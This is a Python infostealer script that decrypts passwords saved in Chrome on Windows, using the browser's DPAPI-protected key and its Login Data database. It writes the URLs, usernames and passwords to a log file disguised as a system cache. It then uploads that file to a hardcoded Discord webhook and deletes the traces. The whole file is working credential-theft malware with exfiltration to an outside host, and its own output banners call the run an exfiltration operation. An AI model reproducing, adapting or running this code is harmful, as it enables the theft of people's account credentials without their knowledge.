import os, sqlite3, shutil, base64
from datetime import datetime
from Crypto.Cipher import AES
import win32crypt
import requests


def get_encryption_key():
    try:
        local_state_path = os.path.join(os.environ['USERPROFILE'],
                                        'AppData', 'Local', 'Google', 'Chrome',
                                        'User Data', 'Local State')
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.loads(f.read())
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        print(f"🔥 KEY EXTRACTION ERROR: {str(e)}")
        return None


def decrypt_password(buff, key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()  # Remove suffix bytes
        return decrypted_pass
    except Exception as e:
        print(f"🛑 DECRYPT ERROR: {str(e)}")
        return None


def steal_chrome_credentials():
    try:
        print("🕵️ [1/4] STARTING CHROME PASSWORD HARVEST...")

        data_path = os.path.join(os.environ['USERPROFILE'],
                                 'AppData', 'Local', 'Google', 'Chrome',
                                 'User Data', 'Default', 'Login Data')
        temp_db = os.path.join(os.environ['TEMP'], 'ChromeDataTemp.db')

        print(f"🔍 [2/4] COPYING DATABASE TO TEMP: {temp_db}")
        shutil.copyfile(data_path, temp_db)

        print("🔓 [3/4] DECRYPTING PASSWORDS...")
        key = get_encryption_key()
        if not key:
            print("🔥 FAILED TO GET ENCRYPTION KEY")
            return []

        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')

        stolen_data = []
        total_creds = 0
        for url, user, encrypted_pass in cursor.fetchall():
            try:
                decrypted = decrypt_password(encrypted_pass, key)
                if decrypted:
                    entry = f"[{datetime.now()}] URL: {url} | USER: {user} | PASS: {decrypted}\n"
                    stolen_data.append(entry)
                    total_creds += 1
            except Exception as e:
                print(f"🛑 DECRYPT ERROR: {str(e)}")
                continue
        conn.close()
        os.remove(temp_db)
        print(f"✅ [4/4] DECRYPTED {total_creds} CREDENTIALS")
        return stolen_data
    except Exception as e:
        print(f"🔥 CRITICAL ERROR: {str(e)}")
        return []






def send_to_discord(data):
    try:
        dump_name = f"SystemCache_{datetime.now().strftime('%Y%m%d%H%M')}.log"
        with open(dump_name, 'w', encoding='utf-8') as f:
            f.writelines(data)

        print("🚀 SENDING TO DISCORD WEBHOOK...")
        webhook_url = 'https://discord.com/api/webhooks/1344682187643027548/dcD-it_jE8SuJv3TlIGJpTsHGfKUd9lRwGGNocMxRHFWmw_ooPwHHLXmJntPhx9ARViY'  # Replace with your webhook URL

        # Send the file as an attachment
        with open(dump_name, 'rb') as f:
            files = {'file': (dump_name, f)}
            response = requests.post(webhook_url, files=files)

        # Check if the request was successful
        if response.status_code == 200:
            print("✅ DATA SENT TO DISCORD SUCCESSFULLY")
        else:
            print(f"💥 DISCORD SEND FAILED: {response.status_code} - {response.text}")

        print(f"🧹 CLEANING UP: DELETING {dump_name}")
        os.remove(dump_name)
        return True
    except Exception as e:
        print(f"💥 DISCORD SEND FAILED: {str(e)}")
        return False


# ====== MAIN EXECUTION ======
if __name__ == "__main__":
    print("""
    ██████╗ ██████╗ ██╗   ██╗███████╗
    ██╔══██╗██╔══██╗██║   ██║██╔════╝
    ██████╔╝██████╔╝██║   ██║█████╗  
    ██╔═══╝ ██╔══██╗╚██╗ ██╔╝██╔══╝  
    ██║     ██║  ██║ ╚████╔╝ ███████╗
    ╚═╝     ╚═╝  ╚═╝  ╚═══╝  ╚══════╝
    """)

    print("🚀 STARTING OPERATION: CHROME CREDENTIAL HARVEST (ONE-TIME RUN)")
    passwords = steal_chrome_credentials()

    if passwords:
        print(f"📡 FOUND {len(passwords)} CREDENTIALS. ATTEMPTING EXFILTRATION...")
        success = send_to_discord(passwords)
        if success:
            print("🎯 EXFILTRATION SUCCESSFUL | NO PERSISTENCE INSTALLED")
    else:
        print("⏳ NO CREDENTIALS FOUND. EXITING...")